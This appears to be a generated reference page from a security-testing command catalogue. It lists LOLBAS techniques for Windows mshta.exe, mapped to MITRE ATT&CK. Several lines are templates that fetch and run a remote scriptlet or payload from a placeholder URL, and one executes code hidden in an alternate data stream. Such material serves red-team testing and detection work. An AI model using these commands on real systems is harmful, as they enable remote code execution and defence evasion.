---
parsed_by: focuslocust
source: commands
type: generated
---
# Mshta Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Mshta.exe

Tool page: [Mshta.exe](../../tools/windows/mshta.exe.md)

### Execute code

```text
mshta.exe {PATH:.hta}
```

Description:

Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.

Related ATT&CK:

- [T1218.005](../../attack/techniques/T1218.005-mshta.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Mshta.yml` |
| Evidence | Command preserved from source parser. |

### Execute code

```text
mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
```

Description:

Executes VBScript supplied as a command line argument.

Related ATT&CK:

- [T1218.005](../../attack/techniques/T1218.005-mshta.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Mshta.yml` |
| Evidence | Command preserved from source parser. |

### Execute code

```text
mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
```

Description:

Executes JavaScript supplied as a command line argument.

Related ATT&CK:

- [T1218.005](../../attack/techniques/T1218.005-mshta.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Mshta.yml` |
| Evidence | Command preserved from source parser. |

### Execute code hidden in alternate data stream

```text
mshta.exe "{PATH_ABSOLUTE}:file.hta"
```

Description:

Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.

Related ATT&CK:

- [T1218.005](../../attack/techniques/T1218.005-mshta.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Mshta.yml` |
| Evidence | Command preserved from source parser. |

### Downloads payload from remote server

```text
mshta.exe {REMOTEURL}
```

Description:

It will download a remote payload and place it in INetCache.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Mshta.yml` |
| Evidence | Command preserved from source parser. |
